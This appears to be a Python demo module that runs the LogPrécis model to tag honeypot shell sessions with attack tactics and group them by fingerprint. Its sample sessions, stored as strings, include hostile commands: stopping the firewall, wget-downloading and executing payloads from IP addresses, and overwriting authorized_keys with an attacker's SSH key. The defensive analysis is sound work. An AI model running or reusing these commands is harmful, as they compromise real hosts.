"""A pocket-sized LogPrécis, for the live demo in 01_intro.py.

Unlike darkvec_lab.py, nothing is re-implemented here: the model *is* the one
published with the paper (https://huggingface.co/SmartDataPolito/logprecis), a
CodeBERT domain-adapted on >20k Unix sessions and fine-tuned for token
classification on 360 labelled ones.  What this module adds is the plumbing the
paper describes but a `pipeline(...)` call does not do for us:

  * tokens -> words: the model labels sub-word tokens, the analyst reads words,
    so we keep the label of the *first* token of each word (Section 3.3 of the
    paper, standard NER practice);
  * words -> fingerprint: consecutive repetitions of the same tactic collapse
    into one entry, which is exactly the paper's session fingerprint.

The sessions below are the paper's own examples (Fig. 1, Tab. 8) plus a small
synthetic campaign, kept short enough to fit a slide - real honeypot sessions
run to hundreds of statements and need the paper's context-chunking.
"""

# The seven labels the model was fine-tuned on: five MITRE ATT&CK tactics, plus
# "Harmless" for sessions that fit no MITRE category (e.g. `echo pwned`) and
# "Other" for the tactics too rare to keep a class of their own.
TACTICS = ("Execution", "Discovery", "Persistence", "Impact", "Defense Evasion", "Harmless", "Other")

# The paper's opening example (Section 1 and Fig. 1): the attacker first takes
# the firewall down, then downloads and runs a payload.  Two intents, one line.
SESSION = "etc/init.d/iptables stop ; wget -c http://10.10.10.10:8080/exec ; chmod 777 exec ; ./exec ;"

# Tab. 8 of the paper: the *same* command `rm`, three sessions, three intents.
# Wiping your own probe file is Discovery, wiping the owner's authorized_keys to
# install yours is Persistence, wiping the binary you just copied is Execution.
# This is the case a context-free embedding (Word2Vec) cannot represent at all.
RM_SESSIONS = (
    'passwd ; echo "321" > /var/tmp/.var03522123 ; rm -rf /var/tmp/.var03522123 ; cat /var/tmp/.var03522123 | head -n 1 ;',
    'cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa SSHKEY== user" >> .ssh/authorized_keys && chmod -R go= ~/.ssh ;',
    "wget http://122.234.28.153:37365/i ; chmod 777 i || ( cp /bin/ls ii ; cat i > ii ; rm i ; cp ii i ; rm ii ) ; ./i ;",
)

# Six *unique* sessions: no two are the same string, because the payload name,
# the drop server and the SSH key change every time - the randomisation that
# makes ~90% of the words in real attack logs appear exactly once (Section 3.1).
# `jeSjax` and `i` are names actually observed in the paper's logs (Section 5.3);
# the other payload names are invented - do not quote them as indicators.
CAMPAIGN = (
    "cd /tmp || cd /var/run ; rm -rf i ; wget http://26.16.27.120:56118/i ; chmod 777 i ; ./i ;",
    "cd /tmp || cd /var/run ; rm -rf a7Kq ; wget http://91.240.118.9:41221/a7Kq ; chmod 777 a7Kq ; ./a7Kq ;",
    "cd /tmp || cd /var/run ; rm -rf jeSjax ; wget http://185.62.190.2:8080/jeSjax ; chmod 777 jeSjax ; ./jeSjax ;",
    'cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa SSHKEY== user" >> .ssh/authorized_keys && chmod -R go= ~/.ssh ;',
    'cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa OTHERKEY== admin" >> .ssh/authorized_keys && chmod -R go= ~/.ssh ;',
    SESSION,
)


def statements(session: str, limit: int = 4) -> list[str]:
    """The session as the shell reads it: statements separated by ; && || - one per line."""
    parts, current = [], ""
    for word in session.split():
        if word in (";", "&&", "||"):
            parts.append(f"{current.strip()} {word}")
            current = ""
        else:
            current += f" {word}"
    parts += [current.strip()] if current.strip() else []
    return parts[:limit]


def tactics_of(logprecis, session: str) -> list[tuple[str, str]]:
    """Run LogPrécis and return one (word, tactic) pair per word of the session.

    The model classifies *tokens*, so a word split into several sub-words gets
    several predictions; as is standard in NER, the first one wins.
    """
    predictions = logprecis(session)

    pairs, cursor = [], 0
    for word in session.split():  # the shell's own notion of a word, separators included
        start = session.index(word, cursor)
        cursor = start + len(word)
        inside = [p for p in predictions if start <= p["start"] < cursor]
        pairs.append((word, inside[0]["entity"] if inside else "Other"))
    return pairs


def labelled(pairs: list[tuple[str, str]]) -> list[str]:
    """The word-level view: every word of the session with the tactic it serves."""
    width = max(len(word) for word, _ in pairs)
    return [f"{word:<{width}}  ->  {tactic}" for word, tactic in pairs]


def fingerprint(pairs: list[tuple[str, str]]) -> str:
    """The session fingerprint: the sequence of tactics, repetitions collapsed.

    `wget http://bad/exec ; ./exec ; rm exec ;` becomes
    `Execution x 5 -- Defense Evasion x 3`: the *how* is gone, the *why* remains.
    """
    runs: list[list] = []
    for _, tactic in pairs:
        if runs and runs[-1][0] == tactic:
            runs[-1][1] += 1
        else:
            runs.append([tactic, 1])
    return " -- ".join(f"{tactic} x {count}" for tactic, count in runs)


def rm_in_context(logprecis, sessions: tuple[str, ...] = RM_SESSIONS) -> list[str]:
    """The tactic LogPrécis assigns to `rm` in each session, next to its context."""
    found = []
    for session in sessions:
        pairs = tactics_of(logprecis, session)
        tactic = next(tactic for word, tactic in pairs if word == "rm")
        found.append(f"{tactic:<12}  <-  {around(session, 'rm')}")
    return found


def around(session: str, word: str, before: int = 2, after: int = 12) -> str:
    """The words around `word` - the window leans *forward*, because what makes
    an `rm` Persistence rather than Discovery is usually what comes after it."""
    words = session.split()
    centre = words.index(word)
    start, end = max(0, centre - before), centre + after + 1
    excerpt = " ".join(words[start:end])
    return f"{'... ' if start else ''}{excerpt}{' ...' if end < len(words) else ''}"


def fingerprints_of(logprecis, sessions: tuple[str, ...] = CAMPAIGN) -> dict[str, str]:
    """Group unique sessions by their fingerprint - the paper's 400k -> 3k, in miniature."""
    groups: dict[str, int] = {}
    for session in sessions:
        key = fingerprint(tactics_of(logprecis, session))
        groups[key] = groups.get(key, 0) + 1
    return {key: f"{count} of the {len(sessions)} sessions" for key, count in groups.items()}
